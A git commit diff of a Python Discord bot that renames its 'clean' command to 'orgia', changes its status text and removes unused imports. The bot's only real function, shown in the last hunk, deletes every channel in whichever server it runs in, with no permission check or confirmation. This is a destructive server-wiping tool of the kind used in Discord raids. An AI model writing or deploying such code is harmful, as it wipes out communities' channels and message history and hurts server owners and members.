8696351363c72dfbd98b3581c0d6cca8d4d3aa23
J4ck0505 <80529490+J4ck0505@users.noreply.github.com>
2021-04-22 15:51:09 +0900

    Update clean.py

--- clean.py
+++ clean.py
@@ -3,10 +3,6 @@
 import discord, asyncio
 from discord.ext import commands
 import os
-from discord.ext import commands
-from discord.utils import get
-import random
-from dhooks import Webhook
 
 client = commands.Bot(command_prefix = '?')
 
@@ -16,7 +12,7 @@ async def on_ready():
   # [discord.Status.online = 온라인],[discord.Status.idle = 자리비움],[discord.Status.dnd = 다른용무],[discord.Status.offline = 오프라인]
   await client.change_presence(status=discord.Status.online)
 
-  await client.change_presence(activity=discord.Game(name="치카치카"))
+  await client.change_presence(activity=discord.Game(name="Persona 3"))
   #await client.change_presence(activity=discord.Streaming(name="스트림 방송중", url='링크'))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name="노래 듣는중"))
   #await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="영상 시청중"))
@@ -24,11 +20,9 @@ async def on_ready():
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
 @client.command()
-async def clean(ctx):
-guild = ctx.guild
-  for channel in guild.channels:
-      await channel.delete()
-     
-      
-                
+async def orgia(ctx):
+    guild = ctx.guild
+    for channel in guild.channels:
+        await channel.delete()
+
 client.run(os.environ['token'])
